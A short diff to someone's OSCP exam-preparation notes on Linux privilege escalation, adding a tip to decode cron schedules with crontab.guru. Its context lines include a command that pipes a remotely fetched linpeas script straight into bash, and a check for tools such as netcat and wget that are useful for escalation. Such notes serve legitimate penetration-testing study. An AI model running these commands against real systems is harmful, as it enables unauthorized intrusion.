@@ -44,6 +44,7 @@ description: Just some rough notes in preparation for the OSCP.
   * `curl 10.10.10.1:8080/linpeas.sh | bash`
   * Run the following command to identify possible priivlege escalation efforts:
     * `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
+  * If you've identified a CronJob that may be exploitable then it may be worth plugging it into [CronGuru](https://crontab.guru/#\*/3\_\*\_\*\_\*\_\*).
 
 ### Privilege Escalation - Windows
 
